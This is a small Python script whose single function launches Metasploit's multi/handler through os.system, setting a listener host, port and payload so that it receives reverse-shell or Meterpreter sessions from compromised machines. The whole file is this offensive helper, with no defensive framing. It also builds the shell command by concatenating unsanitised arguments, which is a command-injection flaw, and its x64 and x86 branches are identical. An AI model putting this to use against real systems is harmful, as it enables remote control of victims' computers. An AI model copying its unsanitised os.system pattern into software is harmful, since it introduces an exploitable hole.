import os


def mscript(architecture, types, payload, lhost, lport):

    lhost = lhost.replace("lhost=", "")
    lport = lport.replace("lport=", "")
    if architecture == "x64":
        if types == "YES":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; set AutoLoadStdapi false; exploit -z"')

        elif types == "NO":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; exploit -z"')

    elif architecture == "x86":
        if types == "YES":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; set AutoLoadStdapi false; exploit -z"')

        elif types == "NO":
            os.system('msfconsole -x "use exploits/multi/handler; set lhost ' + lhost + '; set lport ' + lport + '; set payload ' + payload + '; exploit -z"')
